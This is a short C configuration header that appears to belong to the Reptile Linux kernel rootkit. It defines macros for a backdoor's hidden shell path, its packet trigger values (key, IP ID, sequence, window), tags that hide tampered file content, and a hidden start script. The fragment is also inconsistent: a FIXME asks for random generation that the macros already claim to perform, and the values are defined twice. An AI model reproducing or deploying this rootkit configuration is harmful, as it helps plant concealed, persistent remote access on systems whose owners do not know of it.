/*
 * You can change the configurations in this file if you want.
 * But you need to make sure you'll change it in the client too.
 *
 * FIXME: randomly generate KEY, IPID, SEQ and WIN. 
 *
 * Note: I know it is not a good practice to have those configurations
 * constants, but since there is already known issues in Reptile, this 
 * will be the least of your problems. It will be updated next version!
 *
 */

#ifdef CONFIG_BACKDOOR
#   define SHELL_PATH "/"HIDE"/"HIDE"_shell"
#   define KEY generate_random_key()
#   define IPID generate_random_ipid()
#   define SEQ generate_random_seq()
#   define WIN generate_random_win()
#endif

#ifdef CONFIG_FILE_TAMPERING
#   define HIDETAGIN "#<"TAG_NAME">"
#   define HIDETAGOUT "#</"TAG_NAME">"
#endif

#define START_SCRIPT "/"HIDE"/"HIDE"_start"

// Dynamically generated configurations
#include <linux/random.h>

#define DYNAMIC_KEY generate_random_key()
#define DYNAMIC_IPID generate_random_ipid()
#define DYNAMIC_SEQ generate_random_seq()
#define DYNAMIC_WIN generate_random_win()
